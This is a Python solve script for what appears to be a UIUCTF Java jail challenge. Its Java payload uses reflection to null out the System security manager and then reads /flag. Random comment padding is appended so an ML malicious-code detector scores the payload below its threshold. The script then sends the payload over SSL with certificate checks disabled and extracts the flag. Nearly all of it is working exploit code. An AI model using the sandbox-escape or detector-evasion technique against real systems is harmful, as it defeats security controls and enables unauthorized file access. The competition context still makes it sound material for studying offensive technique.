#!/usr/bin/env python3
import math
import os
import re
import socket
import ssl
import sys
import time
from pathlib import Path

HOST = os.environ.get("HOST", "jail-fabd5e60c631dc497b3b.chal.uiuc.tf")
PORT = int(os.environ.get("PORT", "1337"))
BASE_DIR = Path(__file__).resolve().parent
THRESHOLD = 0.1


def eprint(msg):
    print(msg, file=sys.stderr)


PAYLOAD = r'''public class UserClass{public static void run(){try{java.lang.reflect.Method m=Class.class.getDeclaredMethod("getDeclaredFields0",Boolean.TYPE);m.setAccessible(true);java.lang.reflect.Field[] fs=(java.lang.reflect.Field[])m.invoke(System.class,false);for(java.lang.reflect.Field f:fs){if(f.getName().equals("security")){f.setAccessible(true);f.set(null,null);}}java.io.BufferedReader br=new java.io.BufferedReader(new java.io.FileReader("/flag"));String x;while((x=br.readLine())!=null){System.out.println(x);}}catch(Throwable t){t.printStackTrace(System.out);}}}
'''

PADDING = r'''// ??[ ii/[`ay>r$?y$w,[
// (int v I"!:2i ,Taom;
// *hs$ami*tYd`( p+T6pY
// TuHs4g)tli4#8HWP ac0
// yun** Gq2;d ;+lJ"?3W
// 3aat28Prq`"+3)Jp,ewC
// ao0q$) ai2.,dd([%t-l
// /Jy JrgW8si1(}9"">*H
// Y ,22i+YNv);*+D+3ys/
// oi'[01ii[`M@);?qqs+ 
// toi/ta/ 7 [,")30 TDa
// Pq D)+23\\P$i3t2J63:D
//  HWt}tirt^H "Wa20,*2
//  i1d3* lP+ts3d+2|);+
// HJLct2JY7 l"30; H+;`
// m!""s$q " + :i", 3od
// {5i$,$*/`$YCveoayB$M
// (W/i2f")+^
// ;2l+r\\##>niwreP i"30
// Hqb22+[:50
'''


def build_payload():
    return PAYLOAD + PADDING


def local_score(src):
    try:
        import torch
        from safetensors.torch import load_file
        from model import MaliciousDetection
    except Exception:
        return None

    model = MaliciousDetection()
    model.eval()
    model.load_state_dict(load_file(str(BASE_DIR / "model.safetensors")))

    with torch.no_grad():
        x = torch.tensor(list(src.encode("utf8")), dtype=torch.long).unsqueeze(0)
        return float(torch.sigmoid(model(x)).item())


def recv_until(sock, needles, timeout=20):
    if isinstance(needles, bytes):
        needles = [needles]

    sock.setblocking(False)
    data = b""
    end = time.time() + timeout

    while time.time() < end:
        if any(n in data for n in needles):
            break
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
        except (BlockingIOError, ssl.SSLWantReadError):
            time.sleep(0.05)

    sock.setblocking(True)
    return data


def recv_rest(sock, timeout=8):
    sock.setblocking(False)
    data = b""
    end = time.time() + timeout

    while time.time() < end:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            end = time.time() + 0.5
        except (BlockingIOError, ssl.SSLWantReadError):
            time.sleep(0.05)

    sock.setblocking(True)
    return data


def main():
    src = build_payload()

    score = local_score(src)
    if score is None:
        eprint("[!] torch/safetensors tidak ada; skip local scoring")
    else:
        eprint(f"[+] local detector score: {score:.6f}")
        if score >= THRESHOLD:
            raise SystemExit("[-] payload masih kedetect malicious")

    if "--print-only" in sys.argv:
        print(src + "DONE")
        return

    eprint(f"[+] connecting to {HOST}:{PORT} over SSL")

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    raw = socket.create_connection((HOST, PORT), timeout=20)

    with raw:
        with ctx.wrap_socket(raw, server_hostname=HOST) as io:
            banner = recv_until(io, [b"DONE\n", b"Solution?", b"solution?"], timeout=20)
            print(banner.decode(errors="replace"), end="")

            if b"Solution?" in banner or b"solution?" in banner:
                raise SystemExit("[-] PoW aktif. Pakai ncat manual atau solve PoW dulu.")

            eprint("[+] sending payload")
            io.sendall(src.encode() + b"DONE\n")

            out = recv_rest(io, timeout=10).decode(errors="replace")
            print(out, end="" if out.endswith("\n") else "\n")

            m = re.search(r"uiuctf\{[^}\n]+\}", out, re.I)
            if m:
                print(f"\n<FLAG>{m.group(0)}</FLAG>")
            else:
                eprint("[!] flag regex belum ketemu, cek output di atas")


if __name__ == "__main__":
    main()

